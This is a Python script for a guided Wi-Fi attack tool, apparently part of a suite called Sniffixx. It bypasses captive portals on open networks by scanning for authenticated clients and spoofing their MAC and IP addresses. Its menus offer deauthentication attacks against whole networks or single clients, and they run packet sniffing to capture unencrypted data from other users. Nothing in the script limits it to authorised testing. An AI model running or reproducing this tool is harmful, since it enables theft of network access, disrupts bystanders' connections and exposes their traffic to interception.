#!/usr/bin/env python3
import subprocess, time, re, tempfile, os, sys


# Get the directory where the script is located
script_dir = os.path.dirname(os.path.abspath(__file__))

# Change working directory to the script's directory
os.chdir(script_dir)

def print_banner():
    print("""
╔═══════════════════════════════════════════════════════════╗
║          Captive Portal Bypass - Guided Mode             ║
╠═══════════════════════════════════════════════════════════╣
║  This tool helps you bypass captive portals on open      ║
║  WiFi networks by spoofing the MAC address of an           ║
║  authenticated client.                                   ║
║                                                           ║
║  Step 1: Connect to an open network                      ║
║  Step 2: Check if it has a captive portal               ║
║  Step 3: Find an active client MAC (optional)           ║
║  Step 4: Spoof that MAC to bypass the portal              ║
╚═══════════════════════════════════════════════════════════╝
""")

def guided_wizard(iface):
    """Guided wizard mode - explains each step"""
    print("\n=== Guided Wizard Mode ===")
    print("This mode will guide you through each step with explanations.")
    print()
    
    # Step 1: Connect
    print("📌 Step 1: Connect to an open network")
    print("   We'll scan for networks without encryption.")
    print("   If connection fails, try moving closer to the AP.")
    print()
    scan_reminder()
    spoof_mac(iface)
    ssid = pick_network_with_rescan(iface)

    # Step 2: Connect and check
    print("\n📌 Step 2: Connect to network")
    print("   We'll attempt to connect and check for captive portal.")
    connected = connect_open_network(iface, ssid)
    if not connected:
        print("❌ Connection failed. Suggestions:")
        print("   - Move closer to the access point")
        print("   - Try a different network")
        print("   - Reset your adapter (option 22 in Sniffixx)")
        input("\nPress Enter to retry...")
        os.execv(sys.executable, [sys.executable] + sys.argv)

    # Step 3: Check for portal
    print("\n📌 Step 3: Check for captive portal")
    print("   We'll automatically check if a portal blocks internet access.")
    portal_present = check_captive_portal()
    
    if portal_present:
        print("""
🔐 Captive portal DETECTED!
   
To bypass, you need the MAC address of an active, authenticated client.
Options:
  1) Use Sniffixx in a SECOND terminal to find clients
  2) Try deauth attack to force client reconnection

In Sniffixx, go to: Main Menu > 14 > 2 (Deep Scans with monitor mode)
Find a client BSSID, then return here to continue.
""")
        input("Press Enter when ready to attempt bypass...")
        
        mac = input("[?] Enter client MAC to spoof (e.g., AA:BB:CC:DD:EE:FF): ").strip()
        ip = input("[?] Enter client IP (e.g., 192.168.1.50): ").strip()
        
        print("\n📌 Step 4: Applying MAC spoof...")
        spoof_identity(iface, mac, ip)
        
        print("\n📌 Step 5: Reconnecting...")
        subprocess.run(["dhclient", iface])
        
        test_connectivity()
        check_captive_portal()
    else:
        print("✅ No captive portal detected. Internet should work!")
        test_connectivity()
    
    sniffing_menu(iface)


def list_interfaces():
    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    return re.findall(r"Interface (\w+)", result.stdout)

def spoof_mac(iface):
    print("[*] Spoofing MAC address...")
    subprocess.run(["ip", "link", "set", iface, "down"])
    subprocess.run(["macchanger", "-r", iface])
    subprocess.run(["ip", "link", "set", iface, "up"])

def scan_reminder():
    print()
    print("Be patient, it may take a few tries...")
    print("If you see 'network down' go back to main menu, select the same wifi adapter and use option '22' to reset it.")
    print("If no network appears after a while, it just doesn't find any open one nearby.")
    print("You can cancel a running process via CTRL-C. This will take you back to the main menu.")
    print()
    input("Press Enter to continue...")

    
def scan_open_networks(iface):
    print("[*] Scanning for open networks...")
    time.sleep(2)
    result = subprocess.run(
        ["timeout", "10s", "iw", "dev", iface, "scan"],
        capture_output=True, text=True
    )

    open_ssids = []
    blocks = result.stdout.split("\nBSS ")

    for block in blocks:
        # Skip if no SSID line
        ssid_match = re.search(r"SSID: (.+)", block)
        if not ssid_match:
            continue

        ssid = ssid_match.group(1).strip()

        # Check capability line for "Privacy" flag
        cap_match = re.search(r"capability:.*Privacy", block)
        if cap_match:
            # Has Privacy bit set → encrypted network
            continue

        # Also skip if WPA/RSN explicitly mentioned
        if re.search(r"\bWPA\b|\bRSN\b|\bWEP\b", block):
            continue

        open_ssids.append(ssid)

    return list(set(open_ssids))

def pick_network_with_rescan(iface):
    while True:
        nets = scan_open_networks(iface)
        if not nets:
            print("❌ No open networks found. Retrying in 5 seconds…")
            time.sleep(5)
            continue

        print("\n📡 Available Open Networks:")
        for i, ssid in enumerate(nets, 1):
            print(f"  {i}) {ssid}")

        sel = input("\nChoose network number or press Enter to rescan: ").strip()
        if not sel:
            continue
        if sel.isdigit() and 1 <= int(sel) <= len(nets):
            return nets[int(sel) - 1]
        print("⚠️ Invalid selection. Try again.")

def get_primary_ip_for_iface(iface):
    # Get routing table
    route_output = subprocess.run(
        ["ip", "route", "show", "dev", iface],
        capture_output=True, text=True
    ).stdout.splitlines()

    for line in route_output:
        # Look for a 'src' in the line
        if "src" in line:
            parts = line.split()
            if "src" in parts:
                ip_index = parts.index("src") + 1
                if ip_index < len(parts):
                    return parts[ip_index]
    return None

def connect_open_network(iface, ssid):
    print()
    print("Be patient, depending on connection quality this can take a moment...")
    print()
    print(f"[*] Connecting to {ssid}...")
    conf = tempfile.NamedTemporaryFile(delete=False, mode="w")
    safe_ssid = ssid.replace("\\", "\\\\").replace('"', '\\"')
    conf.write(f"""
network={{
    ssid="{safe_ssid}"
    key_mgmt=NONE
}}
""")
    conf.flush(); conf.close()

    subprocess.run(["killall", "wpa_supplicant"], stderr=subprocess.DEVNULL)
    subprocess.run(["wpa_supplicant", "-B", "-i", iface, "-c", conf.name])
    time.sleep(3)
    subprocess.run(["dhclient", iface])
    
    # Validate connection before proceeding
    ip_output = subprocess.run(
        ["ip", "-4", "addr", "show", iface],
        capture_output=True, text=True
    ).stdout
    if not re.search(r"inet (\d+\.\d+\.\d+\.\d+)", ip_output):
        print(f"❌ Failed to obtain IP address on {iface}. Connection likely failed.")
        return False  # signal failure

    # Show routing table
    print("\n🚦 Current routing table:")
    subprocess.run(["ip", "route"])

    # Extract subnet and IP from routing table
    route_output = subprocess.run(
        ["ip", "route", "show", "dev", iface],
        capture_output=True, text=True
    ).stdout.splitlines()

    subnet = None
    ip = None
    for line in route_output:
        if "src" in line and "/" in line:
            parts = line.split()
            subnet = parts[0]  # e.g. 192.168.3.0/24
            ip_index = parts.index("src") + 1
            if ip_index < len(parts):
                ip = parts[ip_index]
            break

    if subnet and ip:
        print(f"\n💡 Connected via {iface}")
        print(f"   IP Address: {ip}")
        print(f"   Subnet:     {subnet}")
        print("   (Use this subnet for Nmap scans)")
    else:
        print(f"⚠️ Could not determine subnet or IP from routing table.")
        # Fallback to IP from address listing
        ip_output = subprocess.run(
            ["ip", "-4", "addr", "show", iface],
            capture_output=True, text=True
        ).stdout
        match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", ip_output)
        if match:
            ip_addr = match.group(1)
            print(f"\n💡 Your IP on {iface}: {ip_addr}")
            print("   (You may need to manually determine the subnet)")
        else:
            print(f"⚠️ No IPv4 address found for {iface}")

    return True  # signal success
  
def regular_scans_menu(iface):
    while True:
        print(f"""
=== Regular Scans (Interface: {iface}) ===

This menu provides options to find and identify hosts, devices and monitor traffic inside the connected network.

if you want to bypass a captive portal, you need to monitor the network via the deep scans menu, which requires an adapter in monitor mode.

Option 1 provides a fast ping scan. While it reveals all devices in a network, it also tends to reveal devices that once were connected, but are disconnected now. So the list of revealed IPs can be very long.

Option 2 reveals running services along all live hosts. Can be useful to find vulnerabilities.

Option 3 reveals detailed information about now connected devices. This also provides hardware and OS details. Use this to identify actual entry points and potential attack vectors.

Option 4 can be used to capture all traffic throughout the network. Especially useful to find unencrypted information from clients and devices.


1) Nmap live host scan
2) Nmap service/version scan
3) Nmap stealthy hosts/port scan
4) TCPDump capture (connected interface)
5) Back to main menu
""")
        choice = input("Choose: ").strip()

        if choice == "1":
            subnet = input("Enter subnet (e.g. 192.168.1.0/24): ").strip()
            subprocess.run(["nmap", "-sn", "-e", iface, subnet])
        elif choice == "2":
            target = input("Enter target IP or subnet: ").strip()
            subprocess.run(["nmap", "-sV", "-O", "-Pn", "-e", iface, target])
        elif  choice == "3":
            subn = input("Enter subnet (e.g. 192.168.1.0/24): ").strip()
            subprocess.run(["nmap", "-Pn", "-e", iface, subn])
        elif choice == "4":
            subprocess.run(["tcpdump", "-i", iface, "-n", "-c", "50"])
        elif choice == "5":
            break
        else:
            print("Invalid choice.")

def deep_scans_menu(current_iface):
    interfaces = list_interfaces()
    other_ifaces = [i for i in interfaces if i != current_iface]
    if not other_ifaces:
        print("⚠️ No secondary interface available for monitor mode.")
        return

    print("\nAvailable interfaces for monitor mode:")
    for i, ifc in enumerate(other_ifaces, 1):
        print(f"  {i}) {ifc}")
    sel = input("Select interface number: ").strip()
    if not sel.isdigit() or not (1 <= int(sel) <= len(other_ifaces)):
        print("Invalid selection.")
        return

    mon_iface = other_ifaces[int(sel) - 1]
    print(f"[*] Enabling monitor mode on {mon_iface}...")
    subprocess.run(["ip", "link", "set", mon_iface, "down"])
    subprocess.run(["iw", mon_iface, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", mon_iface, "up"])

    while True:
        print(f"""
=== Deep Scans (Monitor mode: {mon_iface}) ===

Steps to prepare for captive portal bypass:

1. Use option 2 to find the target network.
2. Note its BSSID and channel
3. Use option 4 to find comnected clients (you need to enter the BSSID and channel of the target network)
4. Pick an active client and note its BSSID.
5. OPTIONAL: If the target network does not reveal any clients or traffic, either use option 3 to deauth any potential client from it, which forces them to reconnect and reveal their MACs.
  If that fails, too, use option 5 to attempt a special targeted attack to reveal clients and traffic on the network.
  You can also use option 3 to deauth an single targeted client. This could make it easier to connect you as that device, when connecting with his MAC spoofed. If your connection fails, try to keep the deauth attack running in a secons instance while connecting to the network.
5. Go back to the post-connection menu and use the option to attempt captive portal bypass.
6. Enter the client's BSSID when prompted.


1) Capture all packets (tcpdump)
2) Probe for (hidden) SSIDs (airodump-ng)
3) Deauth attack (aireplay-ng)
4) Find clients in open network (airodump-ng)
5) Special Capture
6) Back to post-connection menu
""")
        choice = input("Choose: ").strip()

        if choice == "1":
            subprocess.run(["tcpdump", "-i", mon_iface, "-n"])
        elif choice == "2":
            subprocess.run(["airodump-ng", mon_iface])
        elif choice == "3":
            target_bssid = input("Enter target BSSID: ").strip()
            subprocess.run(["aireplay-ng", "--deauth", "10", "-a", target_bssid, mon_iface])
        elif choice == "4":
            target_bssid = input("Enter target network BSSID: ").strip()
            target_channel = input("Enter network channel: ").strip()
            subprocess.run(["airodump-ng", "--bssid", target_bssid, "--channel", target_channel, mon_iface])
        elif choice == "5":
            subprocess.run(["python3", "target_capture.py"])
            print("Target capture script done!")
        elif choice == "6":
            break
        else:
            print("Invalid choice.")
            
def attempt_captive_portal_bypass(iface):
    print("\n=== Captive Portal Bypass ===")
    print("To bypass a captive portal, you need the MAC address of an already")
    print("authenticated client. Use the Deep Scans menu to find one, or")
    print("enter a MAC you know has access.")
    print()
    print("What is a BSSID/MAC? It's the unique identifier of a device.")
    print("Format: XX:XX:XX:XX:XX:XX (e.g., AA:BB:CC:DD:EE:FF)")
    print()
    mac = input("[?] Enter MAC to spoof (client's BSSID): ").strip()
    if not re.match(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$", mac):
        print("❌ Invalid MAC format. Use XX:XX:XX:XX:XX:XX (e.g., AA:BB:CC:DD:EE:FF)")
        print("   Make sure you have the correct MAC from an active client.")
        return
    
    ip = input("[?] Enter client IP (e.g., 192.168.1.50): ").strip()
    if not re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
        print("❌ Invalid IP format. Use X.X.X.X (e.g., 192.168.1.50)")
        return
    
    spoof_identity(iface, mac, ip)

    print("[*] Reconnecting with spoofed identity...")
    subprocess.run(["dhclient", iface])
    test_connectivity()
    check_captive_portal()

def sniffing_menu(iface):
    while True:
        print(f"""
=== Post-Connection Menu ===

To prepare for a captive portal bypass, continue with the deep scans menu.
This requires a secondary adapter with monitor mode and frame injection support.

Note: Captive portals sometimes fail to be detected. Don't worry. You can still perform the bypass manually. Follow further instructions in the deep scans menu.

1) Regular scans (no monitor mode)
2) Deep scans (monitor mode on secondary interface)
3) Attempt captive portal bypass
4) Restart script (to pick another network)
5) Exit

""")
        choice = input("Choose: ").strip()

        if choice == "1":
            regular_scans_menu(iface)
        elif choice == "2":
            deep_scans_menu(iface)
        elif choice == "3":
            attempt_captive_portal_bypass(iface)
        elif choice == "4":
            print("[↻] Restarting script...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        elif choice == "5":
            print("[✓] Exiting.")
            sys.exit(0)
        else:
            print("Invalid choice.")

def get_gateway(iface):
    route_out = subprocess.run(
        ["ip", "route", "show", "dev", iface],
        capture_output=True, text=True
    ).stdout
    for line in route_out.splitlines():
        parts = line.split()
        if len(parts) > 2 and parts[0] == "default":
            return parts[2]
    return None

def spoof_identity(iface, mac, ip):
    print("[*] Applying spoofed MAC and IP...")
    subprocess.run(["ip", "link", "set", iface, "down"])
    subprocess.run(["macchanger", "-m", mac, iface])
    subprocess.run(["ip", "link", "set", iface, "up"])
    subprocess.run(["ip", "addr", "flush", "dev", iface])
    subprocess.run(["ip", "addr", "add", f"{ip}/24", "dev", iface])
    gateway = get_gateway(iface) or ".".join(ip.split(".")[:-1]) + ".1"
    subprocess.run(["ip", "route", "add", "default", "via", gateway])

def test_connectivity():
    print("[*] Testing internet access...")
    subprocess.run(["ping", "-c", "4", "8.8.8.8"])

def check_captive_portal():
    print("[*] Checking for captive portal...")
    url = "http://connectivitycheck.gstatic.com/generate_204"
    result = subprocess.run(["curl", "-s", "-I", url], capture_output=True, text=True)

    first_line = result.stdout.splitlines()[0] if result.stdout else ""
    status_code = first_line.split()[1] if len(first_line.split()) > 1 else ""
    if status_code == "204":
        print("[✓] No captive portal detected via primary check.")
        # Fallback check using example.com
        fallback = subprocess.run(["curl", "-s", "-I", "http://example.com"], capture_output=True, text=True)
        fb_first = fallback.stdout.splitlines()[0] if fallback.stdout else ""
        fb_code = fb_first.split()[1] if len(fb_first.split()) > 1 else ""
        if fb_code in ("301", "302", "303", "307", "308"):
            print("[!] Redirect detected on fallback domain — captive portal likely present.")
            print(fallback.stdout)
            return True
        return False
    else:
        print("[!] Captive portal likely detected via primary check.")
        print(result.stdout)
        return True

def get_subnet_from_route(iface):
    route_output = subprocess.run(
        ["ip", "route", "show", "dev", iface],
        capture_output=True, text=True
    ).stdout.splitlines()

    for line in route_output:
        if "src" in line and "/" in line:
            parts = line.split()
            subnet = parts[0]
            ip_index = parts.index("src") + 1
            ip = parts[ip_index] if ip_index < len(parts) else None
            return ip, subnet
    return None, None

def main():
    print_banner()
    
    print("📡 Current routing table:")
    subprocess.run(["ip", "route"])

    print("""
Select mode:
1) Guided Wizard (recommended for beginners)
2) Scan and connect to a new network
3) Use an already connected interface
""")
    choice = input("Choose (1/2/3): ").strip()

    if choice == "1":
        # Guided wizard mode
        interfaces = list_interfaces()
        if not interfaces:
            print("❌ No wireless interfaces found.")
            sys.exit(1)
        print("\n[*] Available interfaces:", ", ".join(interfaces))
        iface = input("[?] Enter your wireless interface: ").strip()
        guided_wizard(iface)
    elif choice == "3":
        interfaces = list_interfaces()
        print("\n[*] Available interfaces:", ", ".join(interfaces))
        iface = input("[?] Enter the connected interface to use: ").strip()
        
        ip, subnet = get_subnet_from_route(iface)
        if ip and subnet:
            print(f"\n💡 Using existing connection on {iface}")
            print(f"   IP Address: {ip}")
            print(f"   Subnet:     {subnet}")
            print("   (Proceeding to scan menu…)")
            sniffing_menu(iface)
            sys.exit(0)
        else:
            print("⚠️ Could not extract IP/subnet from routing table. Try option 1 instead.")
            sys.exit(1)

    elif choice == "2":
        interfaces = list_interfaces()
        print("\n[*] Available interfaces:", ", ".join(interfaces))
        iface = input("[?] Enter your wireless interface: ").strip()
        scan_reminder()
        spoof_mac(iface)
        ssid = pick_network_with_rescan(iface)

        connected = connect_open_network(iface, ssid)
        if not connected:
            print("⚠️ Unable to connect. Try another network or move closer to the AP.")
            input("Press Enter to return to the main menu...")
            os.execv(sys.executable, [sys.executable] + sys.argv)

        portal_present = check_captive_portal()
        if portal_present:
            portal_detected = input("[?] Captive portal detected. To continue, you need the MAC of an authenticated AND connected client! To find one, open Sniffixx in a second shell instance, open the captive portal bypass menu once again, selecting option 2 (existing connection). From the deep scan menu monitor the network and isolate one client. Then switch back to this shell and continue with the bypass. Attempt bypass now? (y/n): ").lower() == "y"
            if portal_detected:
                mac = input("[?] Enter MAC to spoof: ").strip()
                ip = input("[?] Enter IP to spoof: ").strip()
                spoof_identity(iface, mac, ip)

                print("[*] Reconnecting with spoofed identity...")
                subprocess.run(["dhclient", iface])
                test_connectivity()
                check_captive_portal()
            else:
                print("[✓] Proceeding without bypass.")
                test_connectivity()
        else:
            print("[✓] No captive portal detected.")
            test_connectivity()
        sniffing_menu(iface)
        print("[✓] Script completed.")

    else:
        print("Invalid choice.")
        sys.exit(1)

if __name__ == "__main__":
    main()